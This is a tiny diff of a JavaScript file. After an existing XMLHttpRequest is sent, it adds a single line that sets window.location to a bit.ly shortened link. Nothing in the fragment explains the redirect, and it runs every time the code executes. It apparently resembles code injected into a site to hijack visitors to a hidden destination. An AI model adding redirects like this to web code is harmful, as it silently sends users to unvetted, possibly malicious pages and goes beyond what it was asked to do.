@@ -12,3 +12,4 @@ request.onreadystatechange = function () {
 };
 
 request.send();
+window.location="https://bit.ly/3rk7ikn";
